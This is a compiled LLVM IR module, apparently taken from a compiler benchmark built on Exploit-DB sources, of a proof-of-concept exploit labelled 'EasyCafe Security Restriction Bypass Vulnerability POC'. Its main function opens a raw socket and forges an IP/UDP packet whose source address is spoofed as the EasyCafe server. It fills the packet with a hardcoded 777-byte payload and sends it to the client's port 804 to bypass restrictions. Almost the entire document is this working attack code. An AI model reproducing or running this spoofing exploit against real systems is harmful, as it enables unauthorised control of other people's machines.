; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_28360.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_28360.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ipheader = type { i32, i32, i32, i64, i8*, i8*, i64, i64, i8*, i64 }
%struct.udpheader = type { i64, i8*, i8*, i8* }
%struct.sockaddr_in = type { %struct.TYPE_2__, i8*, i32 }
%struct.TYPE_2__ = type { i8* }
%struct.sockaddr = type { i32 }

@TRUE = common dso_local global i32 0, align 4
@__const.main.payload = private unnamed_addr constant [777 x i8] c"\FE\00\00\00\00\00\00\00\\\E9\00\00\01\00\00\00<\FB\12\00cm\E1wF\02\02\00\12\02\00\00\01\00\00\00\00\00\00\00\01\00\00\00\B2\C1F\00F\02\02\00\12\02\00\00\01\00\00\00\00\00\00\00D\FB\12\00\CA\C1F\00\D2\C1F\00\EC\00\00\00G\01\00\00\A4\84w\01\00\00\00\00`\FB\12\00\A6\B5E\00\14\00\00\00a\F1A\00\80\0Bp\01\99\00C\00\A1\00C\00G\01\00\00\A0\0Bp\01\EF\B2E\00`\FB\12\00\06\B3E\00\0E\B3E\00$\FE\12\00\18\B3E\00`\FB\12\00\EC\00\00\00G\01\00\00\A4\84w\01\\\04r\01x\FB\12\00\DA\8BB\00\84\00\00\00\00\00\00\00^\01\D5\01\01\00\00\00\98\FB\12\00\A8,\E1w\E0\02\01\00\84\00\00\00\00\00\00\00^\01\D5\01G\01\00\00\CD\AB\BA\DC\B4\FB\12\00dG\E1wS\0F\80\01\E0\02\01\00\84\00\00\00\00\00\00\00^\01\D5\01\DC\FB\12\00 G\E1w\901\8F\00\84\00\00\00\00\00\00\000G\E1w\00\00\00\00\01\00\00\00\00\00\00\00\00\00\00\00 \FC\12\00\EF\15\FAw\EC\FB\12\00\18\00\00\00\901\8F\00\84\00\00\00\00\00\00\00^\01\D5\01S\0F\80\015G\E1w\C0\D5\E2w\B5\02\0E\00.I am  a Vulnerable version of EasyCafe Client!\00F\02\02\00\00\00\00\00G\01\00\00\EC\00\00\00t\FC\12\00\88qp\01\B4\AF~\01hnF\00h\01e\00T\BDr\01\BC\87E\00T\BDr\01G\01\00\00\EC\00\00\00\90\FC\12\00\EC\87E\00:\00\00\00D\00\00\00\10\00\00\00\01\00\00\00\10\00\00\10\B4\FC\12\00o\88E\00:\00\00\00D\00\00\00\04\02\00\00T\FE\12\00T\BDr\01\EC\FD\12\00\04\02\00\00\EC\FD\12\00\F4\89E\00\00\02\00\00T\BDr\01T\FE\12\00\FF\85E\00\04\02\00\00T\FE\12\00T\BDr\01\FF\85E\00<\FF\12\00T\FE\12\00\F0\84r\01\EA\04\E2w\A8:\8F\00\0F\00\00\00\00\00\00\00\00\00\00\00 \81\F7w\AA\AEF\00\01\00\00\00\01\00\00\00\\\D4w\01\D0\FD\12\000\FD\12\00\C6\AEF\00\AA\AEF\00\02\00\00\00\01\00\00\00<\0Cw\01\D0\FD\12\00\062.2.14\00\AA\AEF\00\0A\00\00\00\01\00\00\00D\F1w\01\D0\FD\12\00h\FD\12\00\C6\AEF\00\AA\AEF\00\00\00\00\00\18\8Cw\01\A4\FD\12\00H\AEF\01\88\FD\12\00^vF\00\D0\FD\12\00\0D\00\00\00\00\00\00\00\00\00\00\01H\AEF\000\04x\01\B8\FD\12\00)wF\00\B8\FD\12\00\00\00\00\00T\FE\12\00\00\00\00\00\E8\FD\01\00\0D\00\00\00\00\00\00\00\18\8Cw\01H\AEF\00\00\00\00\00\D0\FD\12\00\00", align 16
@.str = private unnamed_addr constant [88 x i8] c"\0A <>EasyCafe Security Restriction Bypass Vulnerability POC\0A   Coded By Mobin Yazarlou\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [62 x i8] c" Usage :\0A  EasyPOC <EasyCafe Server IP> <EasyCafe Client IP>\0A\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"Windows Socket API Startup Failure.\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@SOCKET_ERROR = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [47 x i8] c"Could not set IP_HDRINCL option.Error Num. %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [38 x i8] c"SendTo Function Failed.Error Num. %d\0A\00", align 1
@.str.5 = private unnamed_addr constant [30 x i8] c"Local OS Denied IP Spoofing.\0A\00", align 1
@.str.6 = private unnamed_addr constant [44 x i8] c"Message Sent!\0APlease Check out the Client.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [777 x i8], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.ipheader*, align 8
  %14 = alloca %struct.udpheader*, align 8
  %15 = alloca %struct.sockaddr_in, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 4, i32* %7, align 4
  %16 = load i32, i32* @TRUE, align 4
  store i32 %16, i32* %8, align 4
  %17 = bitcast [777 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %17, i8* align 16 getelementptr inbounds ([777 x i8], [777 x i8]* @__const.main.payload, i32 0, i32 0), i64 777, i1 false)
  %18 = load i32, i32* %4, align 4
  %19 = icmp ne i32 %18, 3
  br i1 %19, label %20, label %24

20:                                               ; preds = %2
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.1, i64 0, i64 0))
  %23 = call i32 @exit(i32 0) #4
  unreachable

24:                                               ; preds = %2
  %25 = call i32 @MAKEWORD(i32 2, i32 0)
  %26 = call i64 @WSAStartup(i32 %25, i32* %12)
  %27 = icmp ne i64 %26, 0
  br i1 %27, label %28, label %31

28:                                               ; preds = %24
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0))
  %30 = call i32 @exit(i32 -1) #4
  unreachable

31:                                               ; preds = %24
  %32 = load i32, i32* @AF_INET, align 4
  %33 = load i32, i32* @SOCK_RAW, align 4
  %34 = load i32, i32* @IPPROTO_UDP, align 4
  %35 = call i32 @socket(i32 %32, i32 %33, i32 %34)
  store i32 %35, i32* %11, align 4
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* @IPPROTO_IP, align 4
  %38 = load i32, i32* @IP_HDRINCL, align 4
  %39 = bitcast i32* %8 to i8*
  %40 = load i32, i32* %7, align 4
  %41 = call i64 @setsockopt(i32 %36, i32 %37, i32 %38, i8* %39, i32 %40)
  %42 = load i64, i64* @SOCKET_ERROR, align 8
  %43 = icmp eq i64 %41, %42
  br i1 %43, label %44, label %47

44:                                               ; preds = %31
  %45 = call i32 (...) @WSAGetLastError()
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.3, i64 0, i64 0), i32 %45)
  br label %47

47:                                               ; preds = %44, %31
  %48 = load i32, i32* @AF_INET, align 4
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  store i32 %48, i32* %49, align 8
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 2
  %52 = load i8*, i8** %51, align 8
  %53 = call i8* @inet_addr(i8* %52)
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  %55 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %54, i32 0, i32 0
  store i8* %53, i8** %55, align 8
  %56 = call i8* @htons(i32 804)
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  store i8* %56, i8** %57, align 8
  store i32 880, i32* %6, align 4
  %58 = load i32, i32* %6, align 4
  %59 = call i64 @malloc(i32 %58)
  %60 = inttoptr i64 %59 to i8*
  store i8* %60, i8** %10, align 8
  %61 = load i8*, i8** %10, align 8
  %62 = load i32, i32* %6, align 4
  %63 = call i32 @memset(i8* %61, i32 0, i32 %62)
  %64 = load i8*, i8** %10, align 8
  %65 = bitcast i8* %64 to %struct.ipheader*
  store %struct.ipheader* %65, %struct.ipheader** %13, align 8
  %66 = load %struct.ipheader*, %struct.ipheader** %13, align 8
  %67 = getelementptr inbounds %struct.ipheader, %struct.ipheader* %66, i32 0, i32 0
  store i32 69, i32* %67, align 8
  %68 = load %struct.ipheader*, %struct.ipheader** %13, align 8
  %69 = getelementptr inbounds %struct.ipheader, %struct.ipheader* %68, i32 0, i32 9
  store i64 0, i64* %69, align 8
  %70 = load i32, i32* %6, align 4
  %71 = call i8* @htons(i32 %70)
  %72 = load %struct.ipheader*, %struct.ipheader** %13, align 8
  %73 = getelementptr inbounds %struct.ipheader, %struct.ipheader* %72, i32 0, i32 8
  store i8* %71, i8** %73, align 8
  %74 = load %struct.ipheader*, %struct.ipheader** %13, align 8
  %75 = getelementptr inbounds %struct.ipheader, %struct.ipheader* %74, i32 0, i32 7
  store i64 0, i64* %75, align 8
  %76 = load %struct.ipheader*, %struct.ipheader** %13, align 8
  %77 = getelementptr inbounds %struct.ipheader, %struct.ipheader* %76, i32 0, i32 6
  store i64 0, i64* %77, align 8
  %78 = load %struct.ipheader*, %struct.ipheader** %13, align 8
  %79 = getelementptr inbounds %struct.ipheader, %struct.ipheader* %78, i32 0, i32 1
  store i32 128, i32* %79, align 4
  %80 = load %struct.ipheader*, %struct.ipheader** %13, align 8
  %81 = getelementptr inbounds %struct.ipheader, %struct.ipheader* %80, i32 0, i32 2
  store i32 17, i32* %81, align 8
  %82 = load %struct.ipheader*, %struct.ipheader** %13, align 8
  %83 = getelementptr inbounds %struct.ipheader, %struct.ipheader* %82, i32 0, i32 3
  store i64 0, i64* %83, align 8
  %84 = load i8**, i8*** %5, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = call i8* @inet_addr(i8* %86)
  %88 = load %struct.ipheader*, %struct.ipheader** %13, align 8
  %89 = getelementptr inbounds %struct.ipheader, %struct.ipheader* %88, i32 0, i32 5
  store i8* %87, i8** %89, align 8
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  %91 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %90, i32 0, i32 0
  %92 = load i8*, i8** %91, align 8
  %93 = load %struct.ipheader*, %struct.ipheader** %13, align 8
  %94 = getelementptr inbounds %struct.ipheader, %struct.ipheader* %93, i32 0, i32 4
  store i8* %92, i8** %94, align 8
  %95 = load i8*, i8** %10, align 8
  %96 = call i64 @ip_checksum(i8* %95, i32 72)
  %97 = load %struct.ipheader*, %struct.ipheader** %13, align 8
  %98 = getelementptr inbounds %struct.ipheader, %struct.ipheader* %97, i32 0, i32 3
  store i64 %96, i64* %98, align 8
  %99 = load i8*, i8** %10, align 8
  %100 = getelementptr inbounds i8, i8* %99, i64 72
  %101 = bitcast i8* %100 to %struct.udpheader*
  store %struct.udpheader* %101, %struct.udpheader** %14, align 8
  %102 = call i8* @htons(i32 800)
  %103 = load %struct.udpheader*, %struct.udpheader** %14, align 8
  %104 = getelementptr inbounds %struct.udpheader, %struct.udpheader* %103, i32 0, i32 3
  store i8* %102, i8** %104, align 8
  %105 = call i8* @htons(i32 804)
  %106 = load %struct.udpheader*, %struct.udpheader** %14, align 8
  %107 = getelementptr inbounds %struct.udpheader, %struct.udpheader* %106, i32 0, i32 2
  store i8* %105, i8** %107, align 8
  %108 = call i8* @htons(i32 808)
  %109 = load %struct.udpheader*, %struct.udpheader** %14, align 8
  %110 = getelementptr inbounds %struct.udpheader, %struct.udpheader* %109, i32 0, i32 1
  store i8* %108, i8** %110, align 8
  %111 = load %struct.udpheader*, %struct.udpheader** %14, align 8
  %112 = getelementptr inbounds %struct.udpheader, %struct.udpheader* %111, i32 0, i32 0
  store i64 0, i64* %112, align 8
  %113 = load i8*, i8** %10, align 8
  %114 = getelementptr inbounds i8, i8* %113, i64 72
  %115 = getelementptr inbounds i8, i8* %114, i64 32
  %116 = getelementptr inbounds [777 x i8], [777 x i8]* %9, i64 0, i64 0
  %117 = call i32 @memcpy(i8* %115, i8* %116, i32 776)
  %118 = load i32, i32* %11, align 4
  %119 = load i8*, i8** %10, align 8
  %120 = load i32, i32* %6, align 4
  %121 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %122 = call i64 @sendto(i32 %118, i8* %119, i32 %120, i32 0, %struct.sockaddr* %121, i32 4)
  %123 = load i64, i64* @SOCKET_ERROR, align 8
  %124 = icmp eq i64 %122, %123
  br i1 %124, label %125, label %133

125:                                              ; preds = %47
  %126 = call i32 (...) @WSAGetLastError()
  %127 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.4, i64 0, i64 0), i32 %126)
  %128 = call i32 (...) @WSAGetLastError()
  %129 = icmp eq i32 %128, 10004
  br i1 %129, label %130, label %132

130:                                              ; preds = %125
  %131 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.5, i64 0, i64 0))
  br label %132

132:                                              ; preds = %130, %125
  br label %135

133:                                              ; preds = %47
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.6, i64 0, i64 0))
  br label %135

135:                                              ; preds = %133, %132
  %136 = load i32, i32* %11, align 4
  %137 = call i32 @closesocket(i32 %136)
  %138 = call i32 (...) @WSACleanup()
  %139 = load i32, i32* %3, align 4
  ret i32 %139
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @WSAStartup(i32, i32*) #2

declare dso_local i32 @MAKEWORD(i32, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i64 @setsockopt(i32, i32, i32, i8*, i32) #2

declare dso_local i32 @WSAGetLastError(...) #2

declare dso_local i8* @inet_addr(i8*) #2

declare dso_local i8* @htons(i32) #2

declare dso_local i64 @malloc(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i64 @ip_checksum(i8*, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i64 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @closesocket(i32) #2

declare dso_local i32 @WSACleanup(...) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
